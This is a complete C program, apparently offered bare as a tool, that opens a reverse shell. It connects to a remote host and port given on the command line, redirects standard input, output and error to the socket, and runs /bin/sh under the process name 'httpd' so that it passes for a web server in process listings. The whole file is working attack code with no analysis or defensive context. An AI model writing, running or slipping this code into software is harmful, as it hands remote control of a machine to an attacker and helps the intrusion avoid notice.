#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>

int main(int argc,char *argv[]){
	
	struct sockaddr_in sock;
	int s;
	if (argc !=3){fprintf(stderr,"uso:<rhost> <rport> \n");exit(1);}
	sock.sin_family = AF_INET;
	sock.sin_port = htons(atoi(argv[2]));
	sock.sin_addr.s_addr = inet_addr(argv[1]);
	s = socket(AF_INET,SOCK_STREAM,0);

	connect(s,(struct sockaddr_in *)&sock,sizeof(struct sockaddr_in));
	
	dup2(s,0);
	dup2(s,1);
	dup2(s,2);
	execl("/bin/sh","httpd",(char *)0); // process httpd
	
}
